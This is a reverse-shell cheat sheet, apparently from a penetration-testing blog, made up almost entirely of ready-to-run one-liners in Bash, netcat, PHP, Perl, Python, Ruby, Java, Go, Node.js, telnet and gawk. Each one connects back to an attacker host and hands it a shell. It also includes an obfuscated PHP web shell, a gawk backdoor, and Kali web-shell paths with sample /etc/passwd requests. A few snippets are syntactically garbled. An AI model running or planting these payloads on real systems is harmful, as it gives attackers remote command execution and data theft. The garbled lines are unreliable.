##### Set your Netcat listening shell on an allowed port

Use a port that is likely allowed via outbound firewall rules on the target network, e.g. 80 / 443

To setup a listening netcat instance, enter the following:

```bash
root@kali:~# nc -nvlp 80
nc: listening on :: 80 ...
nc: listening on 0.0.0.0 80 ...
```

##### NAT requires a port forward

If you're attacking machine is behing a NAT router, you'll need to setup a port forward to the attacking machines IP / Port.

**ATTACKING-IP** is the machine running your listening netcat session, port 80 is used in all examples below (for reasons mentioned above).

## Bash Reverse Shells[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#bash-reverse-shells)

```bash
exec /bin/bash 0&0 2>&0
```

```bash
0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196
```

```bash
exec 5<>/dev/tcp/ATTACKING-IP/80
cat <&5 | while read line; do $line 2>&5 >&5; done  

# or:

while read line 0<&5; do $line 2>&5 >&5; done
```

```bash
bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
```

## socat Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#socat-reverse-shell)

Source: @filip_dragovic

```bash
socat tcp:ip:port exec:'bash -i' ,pty,stderr,setsid,sigint,sane &
```

## Golang Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#golang-reverse-shell)

```go
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","127.0.0.1:1337");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go
```

## PHP Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#php-reverse-shell)

A useful PHP reverse shell:

```bash
php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
```

Another PHP reverse shell (that was submitted via Twitter):

```bash
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?>
```

Base64 encoded by @0xInfection:

```
<?=$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
```

## Netcat Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#netcat-reverse-shell)

Useful netcat reverse shell examples:

Don't forget to start your listener, or you won't be catching any shells :)

```bash
nc -lnvp 80
```

```bash
nc -e /bin/sh ATTACKING-IP 80
```

```bash
/bin/sh | nc ATTACKING-IP 80
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
```

A reverse shell submitted by [@0xatul](https://twitter.com/atul_hax) which works well for OpenBSD netcat rather than GNU nc:

```bash
mkfifo /tmp/lol;nc ATTACKER-IP PORT 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
```

## Node.js Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#nodejs-reverse-shell)

```bash
require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/80 0>&1');
```

Source: @jobertabma via @JaneScott

## Telnet Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#telnet-reverse-shell)

```bash
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
```

```bash
telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
```

Remember to listen on 443 on the attacking machine also.

## Perl Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#perl-reverse-shell)

```perl
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Perl Windows Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#perl-windows-reverse-shell)

```perl
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

```perl
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Ruby Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#ruby-reverse-shell)

```ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Java Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#java-reverse-shell)

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Python Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#python-reverse-shell)

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Gawk Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#gawk-reverse-shell)

Gawk one liner rev shell by @dmfroberson:

```gawk
gawk 'BEGIN {P=4444;S="> ";H="192.168.1.100";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'
```

```gawk
#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
```

## Kali Web Shells[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-web-shells)

The following shells exist within Kali Linux, under `/usr/share/webshells/` these are only useful if you are able to upload, inject or transfer the shell to the machine.

### Kali PHP Web Shells[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-php-web-shells)

Kali PHP reverse shells and command shells:

COMMAND

DESCRIPTION

`/usr/share/webshells/php/   php-reverse-shell.php`

Pen Test Monkey - PHP Reverse Shell

`/usr/share/webshells/   php/php-findsock-shell.php`

`/usr/share/webshells/   php/findsock.c`

Pen Test Monkey, Findsock Shell. Build `gcc -o findsock findsock.c` (be mindfull of the target servers architecture), execute with netcat not a browser `nc -v target 80`

`/usr/share/webshells/   php/simple-backdoor.php`

PHP backdoor, usefull for CMD execution if upload / code injection is possible, usage: `http://target.com/simple-   backdoor.php?cmd=cat+/etc/passwd`

`/usr/share/webshells/   php/php-backdoor.php`

Larger PHP shell, with a text input box for command execution.

##### Tip: Executing Reverse Shells

The last two shells above are not reverse shells, however they can be useful for executing a reverse shell.

### Kali Perl Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-perl-reverse-shell)

Kali perl reverse shell:

COMMAND

DESCRIPTION

`/usr/share/webshells/perl/   perl-reverse-shell.pl`

Pen Test Monkey - Perl Reverse Shell

`/usr/share/webshells/   perl/perlcmd.cgi`

Pen Test Monkey, Perl Shell. Usage: `http://target.com/perlcmd.cgi?cat /etc/passwd`

### Kali Cold Fusion Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-cold-fusion-shell)

Kali Coldfusion Shell:

COMMAND

DESCRIPTION

`/usr/share/webshells/cfm/cfexec.cfm`

Cold Fusion Shell - aka CFM Shell

### Kali ASP Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-asp-shell)

Classic ASP Reverse Shell + CMD shells:

COMMAND

DESCRIPTION

`/usr/share/webshells/asp/`

Kali ASP Shells

### Kali ASPX Shells[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-aspx-shells)

ASP.NET reverse shells within Kali:

COMMAND

DESCRIPTION

`/usr/share/webshells/aspx/`

Kali ASPX Shells

### Kali JSP Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-jsp-reverse-shell)

Kali JSP Reverse Shell:

COMMAND

DESCRIPTION

`/usr/share/webshells/jsp/jsp-reverse.jsp`

Kali JSP Reverse Shell

# Revser shell

**1. Check which port is allowed for reverse shell**

```
sometime certain out going traffic is blocked by your victim   
nc -nvv -w 1 -z "Your IP Address" 1-100  
open Wireshark  
```

**2. Reverse shell list**

```
Bash  
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

Php  
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

Perl  
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Python  
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Ruby  
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

Netcat  
nc -e /bin/sh 10.0.0.1 1234
(Really like this one)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f 
```